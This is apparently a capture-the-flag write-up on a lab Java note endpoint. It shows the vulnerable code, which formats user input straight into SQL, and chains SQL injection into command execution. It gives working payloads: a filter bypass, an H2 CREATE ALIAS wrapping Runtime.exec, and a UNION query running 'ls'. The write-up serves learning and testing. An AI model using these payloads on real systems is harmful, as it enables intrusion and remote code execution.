
---

# Pentest Notes: SQLi to RCE via H2 Database ALIAS

## Overview
We discovered a SQL injection vulnerability in a note retrieval function. The initial access is gained through a default user account (`user`, `123`)

```sql
INSERT INTO users (id, username, password) VALUES (1, 'user', '123');
```

## Vulnerable Endpoint
The vulnerable Java endpoint is implemented as follows:

```java
@PostMapping("/note")
public ResponseEntity<?> noteByName(@RequestParam String name, HttpSession httpSession) {
    if (httpSession.getAttribute("username") == null) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("unauthorized");
    }
    if (name.contains("$") || name.toLowerCase().contains("concat")) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Bad character in name :)");
    }
    String query = String.format("Select * from notes where name ='%s' ", name);
    List<Object[]> resultList = entityManager.createNativeQuery(query).getResultList();
    List<Map<String, Object>> result = new ArrayList<>();
    for (Object[] row : resultList) {
        Map<String, Object> rowMap = new HashMap<>();
        rowMap.put("ID", row[0]);
        rowMap.put("Name", row[1]);
        rowMap.put("Note", row[2]);
        result.add(rowMap);
    }
    return ResponseEntity.ok(result);
}
```

### Analysis
- **SQL Injection:**  
  The `name` parameter is directly injected into the SQL query without proper sanitization, allowing SQL injection. For example, injecting:
  
  ```
  ' OR 1=1;-- 
  ```
  
  returns all notes.
![Executin](https://github.com/tunsimp/CTF/blob/main/HTB/Pentest%20Notes/SQLI.png)
- **Restricted Characters:**  
  The code checks for the presence of `$` and the keyword `concat` (in any case) to block certain payloads. However, these restrictions can be bypassed since they aren’t needed for creating a function alias.

## Chaining SQLi to RCE with H2 ALIAS
We can leverage a vulnerability in H2 databases that allows us to create a Java ALIAS to execute system commands.

### Step 1: Creating the ALIAS
Using SQL injection, we inject the following payload to create an alias named `EXECVE`:

```sql
'CREATE ALIAS EXECVE AS 'String execve(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}';--
```

*Note:*  
Since `CREATE ALIAS` expects a string parameter, we don’t need to use `$`, and the restriction on `concat` is irrelevant in this context.

### Step 2: Executing the Function
Once the alias is created, we can chain another SQL injection payload to call the function. For example, to list directory contents:

```sql
' UNION SELECT NULL, NULL, EXECVE('ls') AS note;--
```

This payload ensures that the number of columns match (two `NULL` values followed by the function call result), thereby executing the command and displaying its output.
![Executin](https://github.com/tunsimp/CTF/blob/main/HTB/Pentest%20Notes/screenshot.png)

---

